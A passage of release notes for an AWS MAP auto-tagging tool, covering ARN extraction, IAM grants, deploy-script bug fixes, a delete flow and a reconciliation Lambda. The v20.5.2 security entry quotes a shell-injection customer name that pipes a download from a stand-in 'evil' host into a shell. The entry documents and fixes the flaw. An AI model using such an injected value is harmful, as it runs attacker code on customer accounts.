MINOR. Closes §1.31, §1.35, §1.56, §1.57, §1.61, §1.63, §1.65, §1.66, §1.67, §1.68 + roughly 35 other silent-miss classes. No breaking change to existing behavior — the hand-curated `ARN_FIELDS` allowlist remains Tier-1; a new Tier-2 suffix-match runs only when the allowlist misses.

**Root cause.** `extract_arn` reads the subject-resource ARN out of CloudTrail `responseElements`. Every AWS service ships its own field name (`clusterArn`, `functionArn`, `ServiceArn`, `jobQueueArn`, `PhoneNumberArn`, ...). We maintained a hand-curated list of ~90 field names and added to it every time we noticed a silent miss. AWS ships new `*Arn` fields faster than we notice — §1.63 enumerates 46 known-missing fields, and §1.31/§1.35/§1.56/§1.57/§1.65/§1.66/§1.67/§1.68 are the live-confirmed ones. Each miss = tagging path hits `no_arn` skip = customer loses MAP credit with no DLQ entry or alarm.

**What landed.** After the existing allowlist scan runs, a new fallback loop iterates `responseElements` (1-level nested, matching the allowlist's depth) and accepts any key that:

1. ends with `Arn`, `ARN`, or `arn`
2. has a string value starting with `arn:` that parses as a valid 6-segment ARN
3. has an ARN service segment matching the event source (or a declared alias — e.g. `bedrock` events may emit `bedrock-agent` ARNs, `kinesis` events may emit `firehose` ARNs)

**Guards against false positives.** The service-match gate is important: a `CreateFunction` response has both `functionArn` (subject) and `roleArn` (related). The allowlist catches `functionArn` first via its priority list. If a response contained only `someOtherArn: "arn:aws:iam::..."` with a Lambda event source, the fallback would reject it (service mismatch) rather than wrongly tag the IAM role.

**What's NOT in this PR.** The plan's full #43 also deletes ~35 explicit handlers that exist only to bypass the allowlist and removes the `ARN_FIELDS` list entirely. That's held for a follow-up once suffix-match has soaked — deletion is irreversible and the existing 85-service vendor E2E suite is insufficient for the full 98-service sweep the plan requires.

**Verified:** 9/9 unit-test matrix including false-positive rejection (multi-ARN Lambda response picks functionArn not roleArn; non-Arn-suffix keys rejected; plain-ID values rejected; cross-service ARNs rejected). Both Lambda blocks compile; sync-check + cfn-lint + IAM completeness + event-prefix + shell-injection + CFN correctness all green.

---

### v20.6.5 — SSM parameter Intelligent-Tiering (plan-PR #50)

PATCH. Closes audit item §1.60.

**§1.60 — SSM Standard-tier 4KB wall silently fails at ~240 accounts.** `MapConfig` (the JSON configuration that the Lambda reads on every invocation) had no explicit `Tier` on its `AWS::SSM::Parameter` resource, so CFN defaulted it to Standard (4KB Value limit). A customer with ~240+ accounts listed in `scoped_account_ids` generates a Value > 4KB; stack create failed with `ParameterMaxSizeExceeded` and no actionable CFN error message. Added `Tier: Intelligent-Tiering` to both YAML (`map2-auto-tagger-optimized.yaml`) and the configurator's inline template. Intelligent-Tiering stays in the free Standard tier until the Value actually crosses 4KB, at which point AWS auto-upgrades to Advanced ($0.05/parameter/month, $0.60/year for that one parameter). Zero cost impact for normal-sized deployments; graceful auto-upgrade at the 4KB boundary.

No new IAM required — the Intelligent-Tiering upgrade is driven by CloudFormation's deploy-time role at stack create, not by the Lambda. The Lambda's runtime `ssm:GetParameter` grant (scoped to `/auto-map-tagger/${MpeId}/config`) covers both tiers.

---

### v20.6.4 — IAM completeness + CI gate (plan-PR #42)

Tooling + IAM PATCH. YAML runtime Lambda is byte-identical to v20.6.3 except the version stamps and one added IAM row. Closes audit item §1.99; partially addresses §1.64 (introduces the methodology to prevent future siblings).

**§1.99 — Keyspaces `cassandra:Alter` missing.** v20.3.0 (PR #25) shipped the Keyspaces Tier 1 MAP handler with IAM grant `cassandra:TagResource` only. Per the AWS IAM Service Authorization Reference, `keyspaces:TagResource` requires **both** `cassandra:TagResource` and `cassandra:Alter`. Every Keyspaces tagging attempt AccessDenied'd silently — a Tier 1 MAP service claim was live-broken since v20.3.0. Added `cassandra:Alter` to the YAML `ServiceSpecificTagging` policy and to the configurator's inline `TAGGING_PERMISSIONS` mirror. Also added to `.github/sync/tagging-permissions.txt` canonical list.

**New Layer 1 CI check: IAM Completeness (native-dispatch).** `.github/scripts/generate_iam.py` parses `boto3.client('<svc>')` and `get_service_client('<svc>')` calls from the YAML Lambda source, looks up each discovered service's required IAM actions in a hand-curated map (sourced from AWS's IAM Service Authorization Reference), and fails the build if the canonical tagging-permissions list is missing any. The next time someone adds a native-dispatch branch to `do_tag` without the matching IAM grant, CI will block the merge. Prevents future §1.99-class regressions.

**Not addressed in this PR:** the plan's 28-action list (`codeartifact:TagResource`, `appflow:TagResource`, `batch:TagResource`, ...) was audited against the current handler code — only 3 of 28 have any corresponding code (cassandra, cloudformation, geo/location). The other 25 are cargo-cult grants per the plan's own "⚠️ Verify before coding" note ("only add IAM for services we have a handler OR where RGTA dispatches"). RGTA-dispatched services route through `tag:TagResources` + the per-service `<svc>:TagResource` grants already in the canonical list; no additional IAM is required. `cloudformation:DescribeStackSet` (§1.100) was verified as cargo-cult — no handler calls `describe_stack_set`.

---

### v20.6.3 — Configurator-generated shell-script correctness (plan-PR #41)

Tooling-only PATCH. YAML runtime is byte-identical to v20.6.2 except the four version stamps. Closes audit items docx #2, #3, #5, #7.

**docx #2 — `$REGIONS` undefined in multi-account deploy.sh.** The multi-account generator's header set `REGION="…"` (singular) but the stack-state preflight later iterated over `$REGIONS` (plural), which was never defined. The `for CHECK_REGION in $REGIONS` loop silently ran zero iterations, skipping the preflight entirely — a customer running `deploy.sh` on top of a stale `*_IN_PROGRESS` or `ROLLBACK_COMPLETE` stack got no warning. Added `REGIONS="$REGION"` in the multi-account header (multi-account is always pinned to the management-account region selected in the configurator; the plural name is kept to align with the single-account idiom).

**docx #3 — `DEPLOY_STATUS` dead-code guard in multi-account deploy.sh.** The StackSet-instance wait block was gated on `if [ -z "$DEPLOY_STATUS" ]`, but `DEPLOY_STATUS` is initialized to `"NOT STARTED"` at the top of the script. The `-z` test was always false, so the entire 1200-second per-account rollout poll was unreachable. On success, `DEPLOY_STATUS` stayed at `"NOT STARTED"`, which in turn made the backfill-wait block (gated on `[ "$DEPLOY_STATUS" = "SUCCESS" ]`) also never run. Changed the outer guard to `= "NOT STARTED"` and the fallback at block-end likewise, so the block fires on the healthy-path. A 1200s timeout without explicit SUCCESS or FAILURE is treated as SUCCESS (stack create completed; StackSet instance rollout continues asynchronously under CloudFormation's control).

**docx #5 — `printf "$PREFLIGHT_LOG"` treats the log as a format string.** All four report sites replaced with `printf '%b' "$PREFLIGHT_LOG"`. `%b` preserves `\n` → real-newline interpretation (needed — the log is built with literal `\n` escape sequences inside shell-string assignments) while preventing `%` characters in AWS API output from being interpreted as format specifiers.

**docx #7 — Backfill wait polled a nonexistent EventBridge rule.** Both single-account and multi-account backfill-wait loops gated the CloudWatch Logs poll on `aws events describe-rule --name map-auto-tagger-backfill-$MPE` returning `DISABLED`. No such EventBridge rule exists — backfill is implemented as a `Custom::Backfill` CustomResource (one-shot during stack create). Every deploy with backfill enabled silently hit the 1200s timeout before any log poll ran; the customer saw "Backfill is still running" for 20 minutes even when backfill completed in seconds. Removed the rule-state gate; poll the backfill Lambda's log group directly.

**Follow-up identified** (out of scope for this PR, filed for Sprint 2 or later): `generateOrgTemplate` at configurator.html:7099 references `scopedAccountIdsJson` without defining it in its local scope (defined only in `generateMainTemplate` at :5634). A direct `generateOrgTemplate(config)` call throws `ReferenceError`. E2E tests use `deploy_stackset.py` directly, not the configurator-generated deploy.sh, so this never fires in CI — but the `Test deploy.sh generation and execution` job is known-broken in multi-account mode per the Sprint 4 report.

---

### Docs pass — D1–D6 corrections (plan-PR #40, 2026-04-25)

No template version bump — documentation-only corrections against v20.6.2. Closes audit items D1–D6 from the remediation plan's docx series.

- **D1 — Resource-type count aligned to actual.** README, OVERVIEW.md, and COVERAGE.md previously said `140` / `140+` resource types. Actual Lambda handler count is 154 (audit_handler_coverage.py). Updated all five sites to `150+`.
- **D2 — SNS topic name corrected.** INSTRUCTIONS.md step "SNS → Topics → `map-auto-tagger-alerts-…`" was missing the `auto-` prefix; actual topic name is `auto-map-tagger-alerts-${MpeId}` (template line 2074). Customers following the manual-subscribe steps landed on a nonexistent topic.
- **D3 — `tag_non_vpc_services` removed from runtime SSM example.** The INSTRUCTIONS.md SSM `put-parameter` example included `"tag_non_vpc_services": true`, implying customers could tune this at runtime. It is a configurator-only UI control that shapes the generated `scoped_vpc_ids` at deploy time; the runtime Lambda never reads it. Removed from the example and added an explicit field-by-field description of which keys `is_in_scope` actually reads.
- **D4 — Multi-account delete instructions include `delete-stack-instances`.** Prior INSTRUCTIONS.md told customers to run `delete-stack-set` directly, which fails with `StackSetNotEmpty` whenever stack instances exist. Replaced with the correct sequence (delete-stack-instances → wait for SUCCEEDED → delete-stack-set) including `OperationPreferences` for parallel rollout. Also pointed customers at the new v20.6.0 `delete.sh` generator as the recommended path.
- **D5 — COVERAGE.md adds Directory Service, CloudHSM v2, Keyspaces.** PR #25 shipped handlers for Simple AD + Microsoft AD (`ds:AddTagsToResource`), CloudHSM v2 clusters and HSMs (`cloudhsm:TagResource`), and Keyspaces namespaces (`keyspaces:TagResource`), but COVERAGE.md's "Supported Services" table never got updated. Added one row each under Security & Identity / Database.
- **D6 — IAM-without-handler audit verified current.** Spot-checked the COVERAGE.md "Supported Services" table against the Lambda handler list; no ghost claims were found that don't have a corresponding handler or RGTA catch-all. (The deeper handler-gap sweep is tracked separately as plan-PR #53.)

---

### v20.6.2 — Backfill robustness (plan-PR #38)

Tooling-only PATCH; YAML runtime is byte-identical to v20.6.1 except the four version stamps. Closes audit items §1.52 and §1.53. §1.54 verified not applicable — the configurator-generated `BackfillTrigger.ScopedAccounts` is a JSON-encoded Custom Resource property, not a CFN `Type: String` parameter; `json.loads` in the handler correctly parses it (no CSV collapse possible).

**§1.52 — Backfill `lookup_events` retry misses `ThrottledException` variant.** CloudTrail normally throws `ThrottlingException` (with "ing") but the "ed" variant has been observed in this class (same as PR #17). Prior check was `'ThrottlingException' in err_str or 'Rate exceeded' in err_str`; now additionally matches `ThrottledException` for defensive symmetry.

**§1.53 — Backfill always reported SUCCESS with misleading Reason, masking partial failures.** `lookup_events` swallowed CloudTrail errors after 4-retry exhaustion, counted only successful returns, and the Custom Resource response said `Backfill: N sent, 0 errors` even when half the event types failed lookup. Fix: `lookup_events` now returns `(results, lookup_error)` tuple; handler counts how many of the ~140 event types failed lookup; Reason now reports `Backfill: {sent} sent, {send_errors} send errors, {lookup_errors}/{N} event types failed lookup` so operators reading CFN event history can see real outcome. Still reports SUCCESS to CFN (backfill is best-effort — live tagging is unaffected, and a FAILURE here would block stack create for transient CloudTrail throttles). Top-level catch-all Reason also truncates error message to 300 chars to stay under CFN's 4KB Reason cap.

---

### v20.6.1 — Editor update.sh + upgrade.sh SemVer guard hardening (plan-PR #37)

Tooling-only PATCH. YAML runtime is byte-identical to v20.6.0 except for the four version stamps. Closes audit items §1.41, §1.47, §1.48.

**§1.47 — Editor update.sh: missing `--region` on every aws CLI call.** The generated Day-2 account-scope script relied on `AWS_DEFAULT_REGION` / CLI config to target the right region. Customers in CloudShell without that set, or with a different home region than the deployment, either failed the `describe-stack-set` lookup or worse — applied the update to the wrong region's StackSet. Every `aws` call now passes `--region "$REGION"` explicitly.

**§1.48 — Editor update.sh: depends on deprecated S3 staging object.** The script downloaded `s3://auto-map-tagger-<account>/map-auto-tagger-accounts-<mpe>.yaml`, modified scope in place, and re-uploaded. That object is written only by the initial multi-account deploy path and could be garbage-collected, stale, or missing entirely (single-account deploys never wrote it; a deployment later promoted to multi-account wouldn't have it either). Replaced with `describe-stack-set --query StackSet.TemplateBody --output text`. The update also drops the re-upload to S3 — the template lives inside the StackSet.

**§1.41 — Upgrade-mode `compare_versions` misclassified malformed SemVer.** Shell integer tests (`-lt` / `-eq`) on non-numeric operands printed an error to stderr but did not abort the function, so the fall-through `echo "patch"` returned for any unparseable input. Examples that misclassified: `v21.0.0-rc1` → `v20.3.0` returned `patch` (should be error), `v20.6` → `v20.6.0` returned `patch` (should be error). New `is_valid_semver` helper enforces `^v?[0-9]+\.[0-9]+\.[0-9]+$`; `compare_versions` returns `"error"` on unparseable input. `upgrade_one` caller fails closed unless `--force` is passed.

**Not changed:** Editor update.sh's sed-based scope edit (stays readable; downstream would want a structured edit but not in this PR), upgrade.sh's parameter-preservation behavior (already correct as of v20.5.3).

---

### v20.6.0 — Configurator delete.sh flow (PR #48b)

**New feature.** MINOR bump per SemVer — safe in-place upgrade for existing deployments (the YAML runtime is byte-identical to v20.5.4 except for the four version stamps; this PR adds a new configurator UI mode and a new generated script).

**Why:** there was no first-class way to remove a MAP Auto-Tagger deployment. Customers either hand-wrote `delete-stack` / `delete-stack-set` invocations or deleted via the CloudFormation console without consistent coverage of the staging S3 bucket and log groups. Missing in particular: deciding whether the bucket should stay (other deployments may still need it) versus go.

**What you get:** a fourth mode card in `configurator.html` — "Delete existing deployment". Three-step flow (Configure → Review → Download) mirroring Deploy / Editor / Upgrade. Generates `delete-all.sh` (or `delete-<mpe1>-<mpe2>.sh` when scoped to specific MPEs). The script:

- Enumerates matching CloudFormation deployments in the selected region (`map-auto-tagger-mig*`, both single-account Stacks and multi-account StackSets).
- Deletes StackSet instances in parallel (100% tolerance, region parallel), waits ≤30min, then deletes the StackSet itself. For single-account Stacks, runs `delete-stack` and waits for completion.
- Inspects the S3 staging bucket `auto-map-tagger-${ACCOUNT}`: **deleted only if no other MAP Auto-Tagger deployments remain**. Otherwise retained so sibling deployments don't break. Race caveat: two simultaneous scoped delete runs could each see the other's stack and both keep the bucket. Accepted — same class as the TOCTOU window we documented in §1.108.
- Optional opt-in: also delete CloudWatch Log Groups matching `/aws/lambda/map-auto-tagger*`. Off by default because logs are audit history.
- **Never deletes:** `map-migrated` tags on AWS resources (MAP credits remain intact), or StackSet admin/execution IAM roles (shared org scaffolding).

Confirmation: customer types `DELETE` (uppercase) before generation — works for both "delete all" and "delete one MPE" paths (mirrors `delete-stack-set` CLI ergonomics).

Idempotent: missing resources are reported as skipped, not failures. Exit code is non-zero only if at least one targeted resource failed to delete.

**Legacy pre-namespacing detection:** if no `map-auto-tagger-mig*` matches but an unnamespaced `map-auto-tagger` stack (pre-v19) exists in the region, the script prints a clear "delete manually with these commands" message instead of silently exiting. Same pattern as v20.5.4's upgrade.sh.

**MPE ID regex in the UI:** permissive — matches the Lambda runtime's `^mig[a-zA-Z0-9]+$` pattern (alphanumeric of any length after the `mig` prefix). Will tighten to `^mig[a-z0-9]{10}$` (H6 follow-up) once the YAML-side regex decision lands across the repo.

**Limits, accepted:** no pre-delete scope-overlap preflight (the deploy-side scope-intersection preflight from PR #38 protects the other direction). No dry-run mode — idempotency + the typed confirmation are the dry-run equivalent.

**Compat:** v20.6.0 customers running the configurator Delete mode do not need to upgrade the YAML template first. The delete flow targets whatever `map-auto-tagger-mig*` happens to be deployed, regardless of version. Customers on v20.5.4 and earlier can safely use a v20.6.0-generated `delete.sh` against their older deployments.

English-only for the new i18n keys (`ui_mode_delete_title`, `ui_delete_*`, `err_delete_*`); 7 non-English locales fall back to English via existing `t()` behavior. Translation follow-up flagged.

No Layer 2 E2E in this PR — the E2E harness for delete.sh ships as PR #48c per Sprint 7 P3 mandate.

Co-authored-by: Jin Shan Ng (Wave-0 scope, aws-samples PR #27 commits `b034c93` + `a392cea`).

### v20.5.4 — Rename Upgrade-mode output `update.sh` → `upgrade.sh` (PR #48a)

Tooling-only; YAML byte-identical to v20.5.3 except for the four version stamps. No runtime Lambda change. Customers who have already deployed are not affected. Customers running `upgrade.sh` next should re-download from the configurator.

**The collision:** the configurator's Upgrade-mode flow (which replaces Lambda code / IAM / EventBridge to the latest template version) and its Editor-mode flow (which adds or removes accounts from scope without redeploying) both generated a file named `update.sh`. A customer running both flows would get two downloads with the same filename and no way to distinguish "upgrade version" from "change account scope" by name. Renames the Upgrade-mode output to `upgrade.sh`; Editor-mode continues to emit `update.sh`.

Renames are cosmetic — the script body is unchanged, SSM paths are unchanged, CFN resource names are unchanged. A customer with an `update.sh` on disk from v20.5.3 can still run it; it will work identically to v20.5.4's `upgrade.sh`.

Co-authored-by: Jin Shan Ng (aws-samples PR #27 proposal).

### v20.5.3 — Generated update.sh — fix `--use-previous-parameters` (PR #47)

**Severity: high** (every customer upgrade attempt failed on first run). No runtime Lambda change; YAML is byte-identical to v20.5.2 except for the four version stamps.

**The bug (U1):** `configurator.html`'s upgrade-flow generator produced an `update.sh` that called `aws cloudformation update-stack` and `update-stack-set` with `--use-previous-parameters`. That flag does not exist on either command in AWS CLI v2 (only `--use-previous-template`, which is a different thing). Both call sites failed with `Unknown options: --use-previous-parameters`. PR #26 shipped this broken; any customer who downloaded update.sh and tried to upgrade hit the error immediately.

**The fix:** the generated script now calls `describe-stack-set` / `describe-stacks` first to enumerate the current parameter keys, then builds a `--parameters ParameterKey=<K>,UsePreviousValue=true ...` list dynamically. Each existing parameter value is carried forward. Newly-added template parameters (for example `ReconciliationInterval` from v20.5.0) pick up the new template's `Default` automatically because they are omitted from the `--parameters` list — this is the CFN-documented behavior. If the describe call returns an empty result, the script aborts with a clear error rather than proceeding with an empty parameter list.

Affects only the `update.sh` generator; deploy.sh and the in-place scope-edit editor flow are unchanged.

### v20.5.2 — Security: generator-side shell-injection fix (PR #46)

**Security class: supply-chain RCE.** Severity: high. No runtime Lambda change; the YAML template is byte-identical to v20.5.1. Customers who already deployed are NOT affected. Customers generating a fresh `deploy.sh` should re-download from the configurator before next deploy.

**The bug (U4):** `configurator.html` emitted the customer-name field into the generated `deploy.sh` as `CUSTOMER="${customerDisplay}"`, inside double quotes. The JS-side escape only neutralized single quotes. In double-quoted bash, `$(...)`, backticks, `\`, and `$VAR` all still expand. A partner-supplied customer name like `Acme $(curl evil|sh) Corp` would execute the subshell when the customer pasted the generated script into CloudShell — arbitrary code at AdministratorAccess on the customer's management account.

**The fix:** customer-name now emits as `CUSTOMER=${customerDisplay}` (no surrounding quotes) where `customerDisplay` is the output of a `shellSingleQuote` helper that wraps the value in single quotes and escapes embedded single quotes via the canonical `'\''` close-insert-reopen pattern. CR/LF are stripped so a newline cannot escape a shell comment either. Applies to both the single-account and multi-account deploy.sh generators.

**Guardrail:** new Layer 1 CI check `Shell Injection Guard` (`lint_shell_injection.py`) fails the build if the double-quoted customer-value shape is reintroduced. Verified against the regression — reintroducing `CUSTOMER="${customerDisplay}"` fails the check on both emit sites.

### v20.5.1 — Hygiene fixes (SSM TTL, events:TagResource, ConfigParameter output)

Three independent correctness fixes (PR #44). No new capability — tightens existing code against latent failure classes.

**Fixes:**

- **Config SSM cache now has a 60-second TTL.** Previously `_config` was populated on first cold-start call and never invalidated. Warm containers live ~15 min, so an MPE rotation via SSM would be silently misattributed to the old MPE for up to one container lifetime. 60 s bounds the window without meaningful extra SSM load.
- **Added `events:TagResource` IAM permission.** `ServiceSpecificTagging` previously listed only `iotevents:TagResource` (IoT Events, a different service). Tagging a newly-created EventBridge rule / bus / schedule / connection AccessDenied, silently landing in the permanent-actionable DLQ path. Applies to both YAML + configurator-generated templates.
- **CFN Output `ConfigParameter` now returns the real parameter path.** Previously emitted the literal string `/auto-map-tagger/config` instead of `/auto-map-tagger/<mpe>/config`. Customers following docs to `aws ssm get-parameter --name <output>` got `ParameterNotFound`. Fix uses `!Ref MapConfig` so the output stays in sync if the parameter is ever renamed.

All three were previously tracked in memory as H2 / H4 / H5 from the 2026-04-24 correctness sweep. H1 shipped in PR #35, H3 was closed by PR #37's three-path classifier.

### v20.5.0 — Reconciliation Lambda (daily safety-net)

Adds a second Lambda that runs once per day (configurable via new `ReconciliationInterval` CFN parameter) as a safety-net for silent-failure classes the live tagging Lambda cannot catch. Design locked in PR #36.

**What reconciliation does:**

- Enumerates every taggable resource in-account via `resourcegroupstaggingapi:GetResources` (no 90-day CloudTrail limit).
- For each resource: checks the current `map-migrated` tag value.
- **Missing tag** → synthesizes a CloudTrail-shaped event, sends to existing `EventQueue` SQS → live Lambda tags via its normal three-path classifier.
- **Wrong-MPE value** → same path (always overwrite to our MPE). Architecturally safe because PR #38's Q3 Option D preflight prevents overlapping-scope deploys.
- **Correctly tagged** → no action, counted in metrics.

**What reconciliation does NOT do:**

- Not a replacement for live tagging — live Lambda stays the ~60–90 s fast path; reconciliation is 24h catch-up.
- Not a replacement for `BackfillFunction` — backfill covers the <90-day install window; reconciliation runs alongside for ongoing catch-up. Both ship.
- No cross-account — per-account Lambda (matches StackSet architecture per PR #35).
- No pagination checkpoint / resume state — 15-min Lambda ceiling with `ReconciliationTimeoutCanary` metric at 13 min. Deferred until a >100K-resource customer surfaces (design §9).
- No alert-only mode for wrong-MPE — always overwrites (design §3).

**New CFN resources:** `ReconciliationFunction`, `ReconciliationSchedule`, `ReconciliationRole`, `ReconciliationLogGroup` (RetentionInDays 14 matching #29), `ReconciliationSchedulePermission`.

**New CFN parameter:** `ReconciliationInterval` (default `rate(24 hours)`, min 1 hour).

**New CloudWatch metrics** (namespace `MapAutoTagger`):

- `ReconciliationResourcesScanned` — total resources examined per run
- `ReconciliationMissingTag` — resources without any `map-migrated` tag
- `WrongMpeCorrected` — resources with a different `map-migrated` value (dims: `ExpectedMpe`, `FoundMpe`)
- `ReconciliationTimeoutCanary` — fires at 13 min elapsed (trend detector for >100K-resource accounts)
- `ReconciliationSkippedNoCreationTime` — resources RGTA omits `CreationTime` for
- `ReconciliationConfigInvalid` — malformed SSM config
- `ReconciliationRunAborted` — hard-failed RGTA page (rare)
- `ReconciliationEnqueueFailed` — SQS `SendMessage` failure

**New IAM for reconciliation role** (separate from live Lambda role): `ssm:GetParameter` scoped to `/auto-map-tagger/<mpe>/config`, `tag:GetResources`, `ec2:Describe*` for VPC membership, `sqs:SendMessage` on `EventQueue`, `cloudwatch:PutMetricData` (Condition-scoped to `MapAutoTagger` namespace per PR #37 pattern), `logs:*` on own log group.

**Edge case documented in `docs/design-reconciliation.md` §3:** if a customer deployed before Q3 Option D preflight existed (pre-PR #38) AND has an active overlapping peer tagger in their account, reconciliation's always-overwrite would flap daily against the peer. Pre-Q3 customers should remove or re-scope the peer before enabling reconciliation. New customers (post-Q3) cannot reach this state.

### v20.4.0 — Three-path error classifier + scope-intersection preflight (#37, #38)

**Runtime: three-path error classifier (#37)**

- Replaced the binary transient/permanent error handler with three paths:
  - **TRANSIENT**: re-raise → SQS redelivery (up to 5× × 180s). Unchanged from v20.3.0.
  - **PERMANENT_IGNORABLE**: silent ack + CloudWatch metric. Resources genuinely deleted between create and tag (Terraform rollback, test-infra churn) no longer generate SNS noise. New markers: `NoSuchBucket`, `InvalidInstanceID.NotFound`, `DBInstanceNotFound`, `DBClusterNotFoundFault`, `InvalidVolume.NotFound`.
  - **PERMANENT_ACTIONABLE**: SNS alert + CloudWatch metric + re-raise → `EventDLQ`. Tag-quota exhaustion, IAM drift, unknown-permanent conditions (B.7 class). Customer ops must triage.
- Closes §1.115 (SQS `TagQueue` quota), §1.116 (RGTA tag-quota), §1.117 runtime side, §1.119 (SCP `AccessDenied` runtime drift), §1.120 (noisy alerts for benign resource-deleted).
- New CloudWatch metric `MapAutoTagger/TagFailureByClass` with `ErrorClass` + `MpeId` dimensions — triage class without log-grepping.
- New IAM: `cloudwatch:PutMetricData` scoped via `cloudwatch:namespace` Condition to `MapAutoTagger`.
- Configurator UI: blank Alert Email now surfaces a loud warning with "Deploy anyway" confirmation (7-language i18n). Soft-breaking — customers with alternative alerting (SIEM, cross-account CloudWatch) can proceed. Subscriber can be added later via `scripts/add_subscriber.sh` (shipped in #34) without redeploy.

**Deploy-time: Q3 Option D scope-intersection preflight (#38)**

- Prevents cross-Lambda MPE contamination (§1.108) at deploy time. Every new deploy checks scope overlap against existing `map-auto-tagger-*` stacks in the target account and hard-fails with the specific peer + overlap element if overlap exists.
- Rules: `account/ALL` dominates; same-mode → set intersection on shared account IDs or shared VPC IDs; cross-mode → deploy-account-in-peer-list check.
- Extends PR #23 batched `SimulatePrincipalPolicy` with `cloudformation:ListStacks` + `ssm:GetParameter` so missing IAM fails fast with precise remediation instead of masquerading as a scope conflict.
- Unreadable peer SSM config now hard-fails with specific remediation instead of "treat as full conflict" fallback.
- Out of scope per design: TOCTOU on simultaneous deploys, manual `ssm put-parameter` edits post-deploy, bypass-configurator deploy paths.
- Makes the reconciliation Lambda (planned for v20.5.0) able to safely overwrite wrong-MPE values without risking tag flap against a live peer.

**Design docs (#36)**

- Added `docs/design-reconciliation.md` — locked design for the reconciliation Lambda that will ship as v20.5.0. Captures the "ship alongside BackfillFunction, not instead of" decision, the wrong-MPE always-overwrite semantics, and the post-Q3 architectural guarantees that make overwrite safe.

---

### v20.3.1 — Bug-fix sweep (#29, #30, #33, #34, #35)

Multiple small fixes that did not warrant individual MINOR bumps. Grouped here retroactively for readability; each shipped as its own PR against v20.3.0.

- **#29 Log group retention**: `AutoTaggerLogGroup` now has `DeletionPolicy: Delete` + `UpdateReplacePolicy: Delete` + `RetentionInDays: 14` (previously `90`). Fixes the "redeploy fails with ResourceExistenceCheck because the orphaned log group outlived stack delete" footgun. Closes §1.74.
- **#30 Date pattern**: `AgreementStartDate` CFN `AllowedPattern` tightened from `^\d{4}-\d{2}-\d{2}$` to `^(19|20)\d{2}-(0[1-9]|1[0-2])-(0[1-9]|[12]\d|3[01])$`. Rejects impossible months/days at CFN parameter validation. Lambda `is_after_agreement` + `is_within_agreement` + BackfillFunction now wrap `strptime` in try/except returning `False` on `ValueError` rather than propagating. Closes §1.129, §1.130.
- **#33 Scope fixes (CRITICAL)**: `ScopedAccountIds` and `ScopedVpcIds` CFN `Type: String` → `Type: CommaDelimitedList`. JSON-array rendering fixed to produce true N-element arrays from `"111,222,333"` input. S3 `get_bucket_tagging` bare-except narrowed to `NoSuchTagSet` only — prevents overwriting the customer's existing `TagSet` on throttle / SCP-deny / transient 5xx. `is_in_scope` VPC mode now returns `False` when `vpc_id is None` instead of falling through to account-scope (respects the customer's explicit VPC-scope intent). Closes §1.1/U2, §1.2/U3, §1.3/U5.
- **#34 SNS backfill helper**: new `scripts/add_subscriber.sh <MpeId> <email>` for existing customers who deployed with the SNS topic but no subscriber. INSTRUCTIONS.md monitoring section leads with "Alerts don't fire unless you subscribe." Existing-customer half of §1.117.
- **#35 Cross-account rip-out**: deleted ~62 LOC of unused cross-account boto3 machinery in the Lambda. Cross-account assume was always dead code; the per-account StackSet architecture is the only supported deployment path. Also removes an unbounded-growth cache and a silent `get_service_client` failure mode that caused permanent tag drops on assume-role failure. Resolves H1.

### v20.3.0 — Tier 1 MAP service handlers (#25)

> **⚠️ Retraction note (added 2026-04-26, plan-PR #56 D12):** Two of the three Tier 1 handlers shipped in v20.3.0 were live-broken at release:
> - **Keyspaces** AccessDenied on every `CreateKeyspace` — IAM policy had `cassandra:TagResource` but missed `cassandra:Alter`, which the AWS IAM Service Authorization Reference requires for `keyspaces:TagResource`. Fixed in v20.6.4 (§1.99, PR #54).
> - **Managed Microsoft AD** silently dropped tags during the `Creating` directory status because `"Directory Status: Creating"` was not in `TRANSIENT_MARKERS` → classified as permanent → no SQS redelivery. Fixed in v20.5.1 (§1.98, PR #44).
> - **CloudHSM v2** was never live-tested at release; status "covered but unverified" until a dedicated E2E fixture lands (cluster init is 10–15 minutes, kept out of the Layer 2 budget).
>
> The bullets below describe what was shipped in code at v20.3.0. Customers running v20.3.0–v20.6.3 should upgrade via `upgrade.sh` to get the live-tagging fixes.

- Added auto-tagging for services on the MAP 2.0 Included Services List that previously had no handler — customers in affected verticals were silently losing credits:
  - **Amazon Keyspaces** (Cassandra-compatible): `CreateKeyspace`
  - **AWS Directory Service**: `CreateDirectory` (Simple AD), `CreateMicrosoftAD` (Managed Microsoft AD)
  - **AWS CloudHSM v2**: `CreateCluster`, `CreateHsm` (HSMs tag through the parent cluster ARN)
- Added IAM permissions: `ds:AddTagsToResource`, `cloudhsm:TagResource`. `cassandra:TagResource` was already granted.
- Added service-specific dispatch for these three services (Resource Groups Tagging API coverage for Keyspaces/DS/CloudHSM is inconsistent; calling the native tag APIs is safer). All three services use distinct API shapes — Keyspaces expects lowercase `{key, value}`, DS and CloudHSM take raw resource IDs instead of ARNs.
- AD Connector (`ConnectDirectory`) intentionally deferred — requires expanding the EventBridge prefix list to admit `Connect*` events, which has broader side effects.
- E2E fixtures deferred to a follow-up PR (CloudHSM cluster initialization is 10–15 minutes, AD provisioning similar; keeping Layer 2 runtime bounded).

### Architecture overhaul: EventBridge → SQS → Lambda

- Replaced direct EventBridge → Lambda invocation with SQS queue (14-day message retention vs EventBridge's 24-hour retry limit)
- Added Dead Letter Queue for events that fail after 5 SQS retries (180s visibility timeout each)
- Added CloudWatch alarm on DLQ depth → SNS notification
- Removed `ReservedConcurrentExecutions` — SQS handles throttling naturally
- SSE-SQS encryption on both queues

### Multi-engagement support

- All resources namespaced by MPE ID (e.g., `map-auto-tagger-mig111`, `/auto-map-tagger/mig111/config`)
- Multiple MAP engagements can coexist in the same organization
- SSM parameter is the single source of truth for MPE ID, scope, and agreement date

### Editor / update.sh workflow

- Added Editor tab to `configurator.html` for day-2 operations
- Generates `update.sh` to add/remove accounts from scope without redeploying
- Supports optional backfill re-run for newly added accounts

### StackSet auto-deployment

- Enabled `AutoDeployment: True` on StackSets — new accounts joining the org automatically receive the Lambda
- Lambda defers to SSM scope parameter for whether to tag — safe for all scoping modes

### Service coverage changes

- Added: EKS `CreateCluster`, OpenSearch managed `CreateDomain`
- Removed 30 non-MAP-eligible services (cross-referenced against official MAP Included Services List, 6 April 2026): Access Analyzer, Amplify, App Runner, Batch, Clean Rooms, CodeArtifact, CodeCommit, CodeGuru, DataZone, Detective, EventBridge, Fraud Detector, GuardDuty, Inspector, IoT Greengrass, IoT TwinMaker, IVS, Lex, Lightsail, Location Service, MWAA, Macie, Q Business, Rekognition, Supply Chain, Transcribe, Verified Permissions, X-Ray
- Reduced Lambda handler count from ~170 to ~140 (faster cold starts)

